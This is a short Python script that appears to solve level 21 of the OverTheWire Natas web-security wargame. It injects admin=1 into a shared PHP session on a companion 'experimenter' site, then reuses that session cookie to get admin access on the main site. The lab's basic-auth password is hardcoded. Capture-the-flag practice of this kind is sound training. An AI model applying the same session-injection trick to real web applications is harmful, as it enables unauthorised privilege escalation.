#!/bin/python3
import requests
url = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1&submit&admin=1'
r = requests.get(url,auth=('natas21','89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'))
sessionid = r.cookies['PHPSESSID']
cookies={'PHPSESSID' : '%s' % sessionid}

url2 = 'http://natas21.natas.labs.overthewire.org/index.php'
r2 = requests.get(url2,cookies=cookies,auth=('natas21','89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'))
print(r2.text)
